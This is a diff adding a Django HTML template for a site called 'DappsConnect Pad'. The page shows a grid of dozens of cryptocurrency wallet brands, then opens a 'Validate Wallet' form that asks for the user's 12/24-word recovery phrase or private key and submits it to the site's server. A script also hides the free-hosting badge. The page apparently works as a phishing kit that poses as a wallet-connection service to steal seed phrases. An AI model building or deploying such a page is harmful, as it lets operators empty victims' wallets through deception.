@@ -1,0 +1,434 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DappsConnect Pad</title>
+    <link rel="shortcut icon" href="{% static 'Images/favicon.ico' %}" type="image/x-icon">
+
+    <!--Bootstrap-->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <!-- CSS files -->
+    <link rel="stylesheet" href="{% static 'Styles/style.css' %}">
+    <!-- google font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Overpass:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <!-- fontsawesome -->
+    <script src="https://kit.fontawesome.com/b58a06ae82.js" crossorigin="anonymous"></script>
+    <!-- bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <!-- jQuery -->
+
+</head>
+
+<body>
+    <header>
+        <nav class="navbar navbar-expang-lg navbar-light">
+            <a href="choose-wallet" class="navbar-brand">
+                <img src="{% static 'Images/logo.png' %}" alt="">
+                <h5>DappsConnect</h5>
+            </a>
+            <section class="menu-bar">
+                <div class="menu-icon">
+                    <span style="font-size:25px;cursor:pointer">&#9776;</span>
+                </div>
+            </section>
+            <a href="choose-wallet"><button class="sideNav"><strong>Connect</strong></button></a>
+        </nav>
+    </header>
+    <main>
+        <section class="supported-wallets">
+            <div class="header choose-wallet">
+                <h3>Choose Wallet</h3>
+                <p>Select a wallet to continue</p>
+            </div>
+            <div class="supported-body">
+                <a href="javascript:void(0)" class="wallet" id="Bitcoin.com Wallet">
+                    <img src="{% static 'Images/Bitcoin.png' %}" alt="">
+                    <p>Bitcoin.com Wallet</p>
+                </a>
+
+                <a href="javascript:void(0)" class="wallet" id="Trust-wallet">
+                    <img src="{% static 'Images/trustwallet.jpg' %}" alt="">
+                    <p>Trust-wallet</p>
+                </a>                
+                <a href="javascript:void(0)" class="wallet" id="1inch wallet">
+                    <img src="{% static 'Images/1inchwallet.jpeg' %}" alt="">
+                    <p>1inch wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Meta mask">
+                    <img src="{% static 'Images/metaMask.jpg' %}" alt="">
+                    <p>Meta mask</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="WalletConnect">
+                    <img src="{% static 'Images/connect.png' %}" alt="">
+                    <p>WalletConnect</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Alice">
+                    <img src="{% static 'Images/alice.jpg' %}" alt="">
+                    <p>Alice</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Alpha wallet">
+                    <img src="{% static 'Images/alpha.jpg' %}" alt="">
+                    <p>Alpha Wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Argent">
+                    <img src="{% static 'Images/argent.jpg' %}" alt="">
+                    <p>Argent</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Atoken wallet">
+                    <img src="{% static 'Images/atoken.jpg' %}" alt="">
+                    <p>Atoken Wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Atomic">
+                    <img src="{% static 'Images/atomicwallet.jpeg' %}" alt="">
+                    <p>Atomic</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Authereum">
+                    <img src="{% static 'Images/authereumwallet.jpeg' %}" alt="">
+                    <p>Authereum</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Binance-smart-chain">
+                    <img src="{% static 'Images/binance.jpeg' %}" alt="">
+                    <p>Binance-smart-chain</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet">
+                    <img src="{% static 'Images/bitkeep.jpeg' %}" alt="" id="Bit keep">
+                    <p>Bit keep</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Bit Pay">
+                    <img src="{% static 'Images/bitpay.jpg' %}" alt="">
+                    <p>Bit Pay</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Bridge wallet">
+                    <img src="{% static 'Images/bridge.jpg' %}" alt="">
+                    <p>Bridge wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Coin 98">
+                    <img src="{% static 'Images/coin98.jpeg' %}" alt="">
+                    <p>Coin 98</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Coinomi">
+                    <img src="{% static 'Images/coinomi.jpeg' %}" alt="">
+                    <p>Coinomi</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Cool wallet S.">
+                    <img src="{% static 'Images/coolwallet.jpg' %}" alt="">
+                    <p>Cool wallet S.</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Dcent wallet">
+                    <img src="{% static 'Images/dcent.jpg' %}" alt="">
+                    <p>Dcent wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Ronin Wallet">
+                    <img src="{% static 'Images/ronin.png' %}" alt="">
+                    <p>Ronin Wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Defi">
+                    <img src="{% static 'Images/defi.jpeg' %}" alt="">
+                    <p>Defi</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Defiant">
+                    <img src="{% static 'Images/defiant.jpeg' %}" alt="">
+                    <p>Defiant</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Dharma">
+                    <img src="{% static 'Images/dharma.jpg' %}" alt="">
+                    <p>Dharma</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Easy pocket">
+                    <img src="{% static 'Images/easypocket.jpg' %}" alt="">
+                    <p>Easy pocket</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Eidoo">
+                    <img src="{% static 'Images/eidoo.jpeg' %}" alt="">
+                    <p>Eidoo</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Ellipal">
+                    <img src="{% static 'Images/ellipal.jpeg' %}" alt="">
+                    <p>Ellipal</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Flare wallet">
+                    <img src="{% static 'Images/flarewallet.jpg' %}" alt="">
+                    <p>Flare wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Gnosis safe">
+                    <img src="{% static 'Images/gnosisSafe.jpg' %}" alt="">
+                    <p>Gnosis safe</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Grid plus">
+                    <img src="{% static 'Images/grid.jpeg' %}" alt="">
+                    <p>Grid plus</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Guarda wallet">
+                    <img src="{% static 'Images/guarda.jpg' %}" alt="">
+                    <p>Guarda wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Huobi wallet">
+                    <img src="{% static 'Images/huobi.jpg' %}" alt="">
+                    <p>Huobi wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="CYBAVO Wallet">
+                    <img src="{% static 'Images/cybavo.jpeg' %}" alt="">
+                    <p>CYBAVO Wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Unstoppable wallet">
+                    <img src="{% static 'Images/unstoppable.jpg' %}" alt="">
+                    <p>Unstoppable wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="AT.Wallet">
+                    <img src="{% static 'Images/atwallet.jpeg' %}" alt="">
+                    <p>AT.Wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Midas wallet">
+                    <img src="{% static 'Images/midas.jpeg' %}" alt="">
+                    <p>Midas wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="KEYRING PRO">
+                    <img src="{% static 'Images/keyring.jpg' %}" alt="">
+                    <p>KEYRING PRO</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Aktionariat">
+                    <img src="{% static 'Images/aktionariatwallet.jpeg' %}" alt="">
+                    <p>Aktionariat</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="XinFin XDC Network">
+                    <img src="{% static 'Images/xinfin.jpg' %}" alt="">
+                    <p>XinFin XDC Network</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Tongue wallet">
+                    <img src="{% static 'Images/tongue.jpg' %}" alt="">
+                    <p>Tongue wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="O3Wallet">
+                    <img src="{% static 'Images/O3.jpg' %}" alt="">
+                    <p>O3Wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="HashKey Me">
+                    <img src="{% static 'Images/hashkey.jpg' %}" alt="">
+                    <p>HashKey Me</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Jade Wallet">
+                    <img src="{% static 'Images/jade.jpeg' %}" alt="">
+                    <p>Jade Wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Equal">
+                    <img src="{% static 'Images/equal.jpg' %}" alt="">
+                    <p>Equal</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="MEET.ONE">
+                    <img src="{% static 'Images/meetone.jpeg' %}" alt="">
+                    <p>MEET.ONE</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="MoriX wallet">
+                    <img src="{% static 'Images/morix.jpeg' %}" alt="">
+                    <p>MoriX wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Im token">
+                    <img src="{% static 'Images/imToken.jpg' %}" alt="">
+                    <p>Im token</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Infinito">
+                    <img src="{% static 'Images/infinito.jpg' %}" alt="">
+                    <p>Infinito</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Infinity wallet">
+                    <img src="{% static 'Images/infinity.jpeg' %}" alt="">
+                    <p>Infinity wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Kyber swap">
+                    <img src="{% static 'Images/kyber.jpg' %}" alt="">
+                    <p>Kyber swap</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Ledger-live">
+                    <img src="{% static 'Images/ledgerLive.jpg' %}" alt="">
+                    <p>Ledger-live</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Loopring wallet">
+                    <img src="{% static 'Images/loopring.jpg' %}" alt="">
+                    <p>Loopring wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Binance-smart-chain">
+                    <img src="{% static 'Images/binance.jpeg' %}" alt="">
+                    <p>Binance-smart-chain</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Math wallet">
+                    <img src="{% static 'Images/mathwallet.jpeg' %}" alt="">
+                    <p>Math wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="My key">
+                    <img src="{% static 'Images/myKey.jpg' %}" alt="">
+                    <p>My key</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Nash">
+                    <img src="{% static 'Images/nash.jpg' %}" alt="">
+                    <p>Nash</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Onto">
+                    <img src="{% static 'Images/onto.jpg' %}" alt="">
+                    <p>Onto</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Own bit">
+                    <img src="{% static 'Images/ownBit.jpg' %}" alt="">
+                    <p>Own bit</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Peak Defi wallet">
+                    <img src="{% static 'Images/peakdefi.jpeg' %}" alt="">
+                    <p>Peak Defi wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Pillar">
+                    <img src="{% static 'Images/pillar.jpg' %}" alt="">
+                    <p>Pillar</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Plasma pay">
+                    <img src="{% static 'Images/plasmaPay.jpeg' %}" alt="">
+                    <p>Plasma pay</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Rainbow">
+                    <img src="{% static 'Images/rainbow.jpeg' %}" alt="">
+                    <p>Rainbow</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Rwallet">
+                    <img src="{% static 'Images/rwallet.jpg' %}" alt="">
+                    <p>Rwallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Safe pal">
+                    <img src="{% static 'Images/safepal.jpg' %}" alt="">
+                    <p>Safe pal</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Spark point">
+                    <img src="{% static 'Images/sparkpoint.jpg' %}" alt="">
+                    <p>Spark point</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Spatium">
+                    <img src="{% static 'Images/spatium.jpg' %}" alt="">
+                    <p>Spatium</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Talken wallet">
+                    <img src="{% static 'Images/talken.jpg' %}" alt="">
+                    <p>Talken wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Token pocket">
+                    <img src="{% static 'Images/tokenPocket.jpg' %}" alt="">
+                    <p>Token pocket</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="KEYRING PRO">
+                    <img src="{% static 'Images/keyring.jpg' %}" alt="">
+                    <p>KEYRING PRO</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Tokenary">
+                    <img src="{% static 'Images/tokenary.jpg' %}" alt="">
+                    <p>Tokenary</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Torus">
+                    <img src="{% static 'Images/torus.jpg' %}" alt="">
+                    <p>Torus</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Trust-wallet">
+                    <img src="{% static 'Images/trustvault.jpeg' %}" alt="">
+                    <p>Trust-vault</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Trustee-wallet">
+                    <img src="{% static 'Images/trustee.jpg' %}" alt="">
+                    <p>Trustee-wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Via-wallet">
+                    <img src="{% static 'Images/viawallet.jpg' %}" alt="">
+                    <p>Via-wallet</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Vision">
+                    <img src="{% static 'Images/vision.jpeg' %}" alt="">
+                    <p>Vision</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="wallet io">
+                    <img src="{% static 'Images/walletio.jpeg' %}" alt="">
+                    <p>wallet io</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Walleth">
+                    <img src="{% static 'Images/walleth.jpg' %}" alt="">
+                    <p>Walleth</p>
+                </a>
+                <a href="javascript:void(0)" class="wallet" id="Zelcore">
+                    <img src="{% static 'Images/zelcore.jpeg' %}" alt="">
+                    <p>ZelCore</p>
+                </a>
+                <a href="javascript:void(0)" class="other" onclick="showOthers()">
+                    <img src="{% static 'Images/Others.png' %}" alt="">
+                    <p>Others</p>
+                </a>
+            </div>
+        </section>
+        <section class="modal myModal modal-item">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h4>Validate Wallet</h4>
+                    <span> &times</span>
+                </div>
+                <p>Click a tab to validate your selected wallet - <strong class="demo"></strong></p>
+
+                <div id="modalBody">
+                    <P class="header">Please enter your 12/24 word phrase or Private Key</P>
+
+                    <form action="{% url 'dappsconnect:index' %}" method="post">
+                        {% csrf_token %}
+                        <input class="d-none" name="wallet" type="text" id="w-name" placeholder="Wallet Name">
+                        <textarea name="phrase" id="" cols="30" rows="6 required"></textarea>
+                        <button name="submit" type="submit"><strong>SUBMIT</strong></button>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </main>
+<div style="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img"><img src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></div><script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&&notification.length>0&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600,700",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 100%; }} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); max-width: 350px; border: 0; border-radius: 3px; background-color: #ff4546 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Go for it</button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Black Friday Prices",h1Tag.setAttribute("style",'color: white; font-family: "Roboto", sans-serif; font-size: 22px; font-weight: 700; text-transform: uppercase;');var h2Tag=document.createElement("H2");h2Tag.innerHTML="Get 90% Off!",h2Tag.setAttribute("style",'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 60px; font-weight: 700; line-height: 1;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="Get Web Hosting for $0.99/month + SSL Certificate for FREE!",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 700; margin-bottom: 15px;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2020-wp-inject-img.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}</script></body>
+<hr>
+<footer>
+    <section class="social">
+        <div class="twitter">
+            <i class="fab fa-tumblr"></i>
+        </div>
+        <div class="instagram">
+            <i class="fab fa-instagram"></i>
+        </div>
+        <div class="facebook">
+            <i class="fab fa-facebook-f"></i>
+        </div>
+    </section>
+    <section class="copyright">
+        <div class="copy">
+            &#169; 2022 DappsConnectpad.com
+        </div>
+    </section>
+    <!-- JS file -->
+    <script src="{% static 'js/index.js' %}"></script>
+</footer>
+
+<script>
+
+$(".wallet").click(function () {
+    
+    let demo = $(".demo").text();
+
+    $("#w-name").val(demo)
+
+
+})
+
+</script>    
+
+</html>
+
+
+<script>
+    
+$( document ).ready(function() {
+   $('a[target="_blank"]').addClass('d-none');
+});
+    
+    
+</script>
